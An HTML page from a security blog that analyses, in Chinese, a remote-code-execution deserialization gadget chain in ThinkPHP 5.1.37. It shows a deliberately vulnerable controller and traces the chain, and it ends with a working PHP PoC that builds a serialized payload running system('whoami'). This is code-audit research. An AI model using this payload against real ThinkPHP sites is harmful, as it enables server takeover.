@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="p0l1st">
+
+
+
+    <meta name="description" content="blog">
+
+
+
+<title>ThinkPHP5.1.X反序列化利用链 | p0l1st&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/b.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
+</head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">p0l1st&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">p0l1st&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">ThinkPHP5.1.X反序列化利用链</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">p0l1st</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 8, 2024&nbsp;&nbsp;12:05:40</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>ThinkPHP5.1.37</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$u</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hhh&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
+<li>有一个内容完全可控的反序列化点:unserialize(可控变量)</li>
+<li>存在文件上传、文件名可控、使用了文件操作函数:file_exists(‘phar:&#x2F;&#x2F;‘)</li>
+</ul>
+<h1 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h1><p>首先全局搜索_destruct()</p>
+<p><img src="/../images/image-20240708121433119.png" alt="image-20240708121433119"></p>
+<p>然后跟进windows类的_destruct方法，发现调用了removeFiles方法，继续跟进</p>
+<p><img src="/../images/image-20240708121529761.png" alt="image-20240708121529761"></p>
+<p>可以看到在这里使用了file_exists对filename进行判断，这里的filename是可控的，并且跟进file_exists可以发现filename被当作字符串，那么就会触发_toString方法</p>
+<p><img src="/../images/image-20240708121618417.png" alt="image-20240708121618417"></p>
+<p><img src="/../images/image-20240708121836989.png" alt="image-20240708121836989"></p>
+<p>全局搜索可利用的_toString方法，选择Conversion类，发现调用了toJson方法，跟进看看</p>
+<p><img src="/../images/image-20240708122013007.png" alt="image-20240708122013007"></p>
+<p>又调用了toArray方法，继续跟进</p>
+<p><img src="/../images/image-20240708122126632.png" alt="image-20240708122126632"></p>
+<p>这里的$relation来自$this-&gt;data[$name]，$name来自$this-&gt;append，都是可控的</p>
+<p>所以$relation-&gt;visible($name)就变成了：**可控类-&gt;visible(可控变量)**，接下来就需要找可利用的visible方法或_call方法</p>
+<p><img src="/../images/image-20240708132448330.png" alt="image-20240708132448330"></p>
+<p><img src="/../images/image-20240708132131155.png" alt="image-20240708132131155"></p>
+<p>全局搜索并没有找到可以利用的visible，搜索_call发现Request类比较好利用，这里的call_user_func_array第一个参数可控，可以传入一个数组，构造call_user_func_array(array(任意类，任意方法), $args)就可以调用任意类的任意方法</p>
+<p><img src="/../images/image-20240708133414554.png" alt="image-20240708133414554"></p>
+<p>但是array_unshift($args, $this)把本类对象放在$args的第一个，我们需要寻找不受这个参数影响的方法</p>
+<p>通过前面分析RCE漏洞我们知道Request类中的input方法可以通过调用filterValue进而调用call_user_func，但是$args的第一个元素是一个固定死的类对象，所以这里不能直接调用input方法，而应该寻找调用input的方法</p>
+<p><img src="/../images/image-20240708135710657.png" alt="image-20240708135710657"></p>
+<p>调用input的方法共有七处，这里选择Request类中的param方法</p>
+<p><img src="/../images/image-20240708140724987.png" alt="image-20240708140724987"></p>
+<p>继续寻找调用了param的方法，发现有isAjax和isPjax，它们传入param方法的第一个参数都可控</p>
+<p><img src="/../images/image-20240708141254668.png" alt="image-20240708141254668"></p>
+<p>至此漏洞链构造完成</p>
+<p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/10.png" alt="10"></p>
+<h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span>=[]</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="variable">$files</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>&#123;</span><br><span class="line">    <span class="title class_">trait</span> <span class="title class_">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">visible</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$relation</span> = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Attribute</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$relation</span>=[],<span class="variable">$visible</span>=[],<span class="variable">$data</span>=[],<span class="variable">$withAttr</span>=[]</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;relation = <span class="variable">$relation</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;visible = <span class="variable">$visible</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = <span class="variable">$withAttr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$relation</span>=[],<span class="variable">$visible</span>=[],<span class="variable">$data</span>=[],<span class="variable">$withAttr</span>=[]</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$relation</span>,<span class="variable">$visible</span>,<span class="variable">$data</span>,<span class="variable">$withAttr</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">relation</span> = <span class="title class_">array</span>(&quot;<span class="title class_">system</span>&quot;=&gt;1);</span><br><span class="line">    <span class="variable">$visible</span> = <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>=&gt;<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>=&gt;<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="variable">$withAttr</span> = <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">    <span class="variable">$pivot</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$relation</span>,<span class="variable">$visible</span>,<span class="variable">$data</span>,<span class="variable">$withAttr</span>);</span><br><span class="line">    <span class="variable">$windows</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="keyword">array</span>(<span class="variable">$pivot</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240708142049120.png" alt="image-20240708142049120"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>p0l1st</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2024/07/08/ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">http://example.com/2024/07/08/ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/07/01/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%89/">ThinkPHP5代码审计:代码执行(三)</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
